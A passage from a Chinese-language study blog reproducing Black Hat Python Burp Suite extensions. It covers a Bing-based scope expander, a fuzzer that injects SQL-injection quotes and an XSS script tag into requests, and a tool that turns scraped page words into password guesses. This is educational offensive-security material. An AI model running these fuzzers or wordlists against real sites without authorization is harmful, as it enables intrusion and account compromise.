</span></span><span class=line><span class=cl>        <span class=n>json_body</span> <span class=o>=</span> <span class=n>json_body</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>json_body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>r</span><span class=p>[</span><span class=s2>&#34;d&#34;</span><span class=p>][</span><span class=s2>&#34;results&#34;</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>site</span> <span class=ow>in</span> <span class=n>r</span><span class=p>[</span><span class=s2>&#34;d&#34;</span><span class=p>][</span><span class=s2>&#34;results&#34;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;*&#34;</span> <span class=o>*</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>site</span><span class=p>[</span><span class=s1>&#39;Title&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>site</span><span class=p>[</span><span class=s1>&#39;Url&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>site</span><span class=p>[</span><span class=s1>&#39;Description&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;*&#34;</span> <span class=o>*</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>j_url</span> <span class=o>=</span> <span class=n>URL</span><span class=p>(</span><span class=n>site</span><span class=p>[</span><span class=s1>&#39;Url&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=ow>not</span> <span class=bp>self</span><span class=o>.</span><span class=n>_callbacks</span><span class=o>.</span><span class=n>isInScope</span><span class=p>(</span><span class=n>j_url</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Adding to Burp scope&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=bp>self</span><span class=o>.</span><span class=n>_callbacks</span><span class=o>.</span><span class=n>includeInScope</span><span class=p>(</span><span class=n>j_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;No results from Bing&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span></code></pre></div><p>從第一個網址開始，透過bing去找出其他相關的加入burp，來擴大搜尋範圍</p><hr><p>bhp_fuzzer.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>burp</span> <span class=kn>import</span> <span class=n>IBurpExtender</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>burp</span> <span class=kn>import</span> <span class=n>IIntruderPayloadGeneratorFactory</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>burp</span> <span class=kn>import</span> <span class=n>IIntruderPayloadGenerator</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>java.util</span> <span class=kn>import</span> <span class=n>List</span><span class=p>,</span> <span class=n>ArrayList</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>BurpExtender</span><span class=p>(</span><span class=n>IBurpExtender</span><span class=p>,</span> <span class=n>IIntruderPayloadGeneratorFactory</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># implements</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>registerExtenderCallbacks</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>callbacks</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_callbacks</span> <span class=o>=</span> <span class=n>callbacks</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_helpers</span> <span class=o>=</span> <span class=n>callbacks</span><span class=o>.</span><span class=n>getHelpers</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>callbacks</span><span class=o>.</span><span class=n>registerIntruderPayloadGeneratorFactory</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># implements</span>
</span></span><span class=line><span class=cl>    <span class=nd>@staticmethod</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>getGeneratorName</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;BHP Payload Generator&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># implements</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>createNewInstance</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>attack</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>BHPFuzzer</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>attack</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>BHPFuzzer</span><span class=p>(</span><span class=n>IIntruderPayloadGenerator</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>extender</span><span class=p>,</span> <span class=n>attack</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_extender</span> <span class=o>=</span> <span class=n>extender</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_helpers</span> <span class=o>=</span> <span class=n>extender</span><span class=o>.</span><span class=n>_helpers</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_attack</span> <span class=o>=</span> <span class=n>attack</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;BHP Fuzzer initialized&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>max_payloads</span> <span class=o>=</span> <span class=mi>1000</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>num_payloads</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>hasMorePayloads</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;hasMorePayloads called.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>num_payloads</span> <span class=o>==</span> <span class=bp>self</span><span class=o>.</span><span class=n>max_payloads</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;No more payloads.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;More payloads. Continuing.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>getNextPayload</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>current_payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># convert into a string</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>current_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># call our simple mutator to fuzz the POST</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>mutate_payload</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># increase the number of fuzzing attempts</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>num_payloads</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>reset</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>num_payloads</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@staticmethod</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>mutate_payload</span><span class=p>(</span><span class=n>original_payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># pick a simple mutator or even call an external script</span>
</span></span><span class=line><span class=cl>        <span class=c1># like Radamsa does</span>
</span></span><span class=line><span class=cl>        <span class=n>picker</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># select a random offset in the payload to mutate</span>
</span></span><span class=line><span class=cl>        <span class=n>offset</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>original_payload</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>original_payload</span><span class=p>[:</span><span class=n>offset</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># random offset insert a SQL injection attempt</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>picker</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;&#39;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># jam an XSS attempt in</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>picker</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;BHP!&#39;);&lt;/script&gt;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># repeat a chunk of the original payload a random number</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>picker</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>chunk_length</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>[</span><span class=n>offset</span><span class=p>:]),</span>
</span></span><span class=line><span class=cl>                                          <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>repeater</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>repeater</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>+=</span> <span class=n>original_payload</span><span class=p>[</span><span class=n>offset</span><span class=p>:</span><span class=n>offset</span> <span class=o>+</span> <span class=n>chunk_length</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># add the remaining bits of the payload</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=n>original_payload</span><span class=p>[</span><span class=n>offset</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>payload</span>
</span></span></code></pre></div><p>就是iterator，會隨機修改request</p><hr><p>bhp_wordlist.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>burp</span> <span class=kn>import</span> <span class=n>IBurpExtender</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>burp</span> <span class=kn>import</span> <span class=n>IContextMenuFactory</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>javax.swing</span> <span class=kn>import</span> <span class=n>JMenuItem</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>java.util</span> <span class=kn>import</span> <span class=n>List</span><span class=p>,</span> <span class=n>ArrayList</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>java.net</span> <span class=kn>import</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>html.parser</span> <span class=kn>import</span> <span class=n>HTMLParser</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>TagStripper</span><span class=p>(</span><span class=n>HTMLParser</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>HTMLParser</span><span class=o>.</span><span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>page_text</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>handle_data</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>page_text</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>handle_comment</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>handle_data</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>strip</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>html</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>feed</span><span class=p>(</span><span class=n>html</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34; &#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>page_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>BurpExtender</span><span class=p>(</span><span class=n>IBurpExtender</span><span class=p>,</span> <span class=n>IContextMenuFactory</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>registerExtenderCallbacks</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>callbacks</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_callbacks</span> <span class=o>=</span> <span class=n>callbacks</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_helpers</span> <span class=o>=</span> <span class=n>callbacks</span><span class=o>.</span><span class=n>getHelpers</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>context</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>hosts</span> <span class=o>=</span> <span class=nb>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># start with something we know is common</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>wordlist</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;password&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># we set up our extension</span>
</span></span><span class=line><span class=cl>        <span class=n>callbacks</span><span class=o>.</span><span class=n>setExtensionName</span><span class=p>(</span><span class=s2>&#34;BHP Wordlist&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>callbacks</span><span class=o>.</span><span class=n>registerContextMenuFactory</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>createMenuItems</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>context_menu</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>context</span> <span class=o>=</span> <span class=n>context_menu</span>
</span></span><span class=line><span class=cl>        <span class=n>menu_list</span> <span class=o>=</span> <span class=n>ArrayList</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>menu_list</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>JMenuItem</span><span class=p>(</span><span class=s2>&#34;Create Wordlist&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                <span class=n>actionPerformed</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>wordlist_menu</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>menu_list</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>wordlist_menu</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>event</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># grab the details of what the user clicked</span>
</span></span><span class=line><span class=cl>        <span class=n>http_traffic</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>context</span><span class=o>.</span><span class=n>getSelectedMessages</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>traffic</span> <span class=ow>in</span> <span class=n>http_traffic</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>http_service</span> <span class=o>=</span> <span class=n>traffic</span><span class=o>.</span><span class=n>getHttpService</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>host</span> <span class=o>=</span> <span class=n>http_service</span><span class=o>.</span><span class=n>getHost</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>hosts</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>host</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>http_response</span> <span class=o>=</span> <span class=n>traffic</span><span class=o>.</span><span class=n>getResponse</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>http_response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>get_words</span><span class=p>(</span><span class=n>http_response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>display_wordlist</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_words</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>http_response</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>headers</span><span class=p>,</span> <span class=n>body</span> <span class=o>=</span> <span class=n>http_response</span><span class=o>.</span><span class=n>tostring</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\r\n\r\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># skip non-text responses</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>headers</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;content-type: text&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>tag_stripper</span> <span class=o>=</span> <span class=n>TagStripper</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>page_text</span> <span class=o>=</span> <span class=n>tag_stripper</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=n>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>words</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;[a-zA-Z]\w{2,}&#39;</span><span class=p>,</span> <span class=n>page_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>words</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># filter out long strings</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>word</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>wordlist</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>word</span><span class=o>.</span><span class=n>lower</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@staticmethod</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>mangle</span><span class=p>(</span><span class=n>word</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>year</span> <span class=o>=</span> <span class=n>datetime</span><span class=o>.</span><span class=n>now</span><span class=p>()</span><span class=o>.</span><span class=n>year</span>
</span></span><span class=line><span class=cl>        <span class=n>suffixes</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=s2>&#34;!&#34;</span><span class=p>,</span> <span class=n>year</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>mangled</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>password</span> <span class=ow>in</span> <span class=p>(</span><span class=n>word</span><span class=p>,</span> <span class=n>word</span><span class=o>.</span><span class=n>capitalize</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>suffix</span> <span class=ow>in</span> <span class=n>suffixes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>mangled</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%s%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>suffix</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>mangled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>display_wordlist</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;# BHP Wordlist for site(s) </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=s2>&#34;, &#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>hosts</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=nb>sorted</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>wordlist</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>password</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>mangle</span><span class=p>(</span><span class=n>word</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span></code></pre></div><p>就是從request的text中撈出word，塞到wordlist</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://littlebees.github.io/2020/09/blackhat-python-github-automation/><span class=title>« Prev</span><br><span>blackhat python - github & automation</span>
</a><a class=next href=https://littlebees.github.io/2020/09/blackhat-python-network-programming/><span class=title>Next »</span><br><span>blackhat python - network programming</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://littlebees.github.io/>記事本</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const 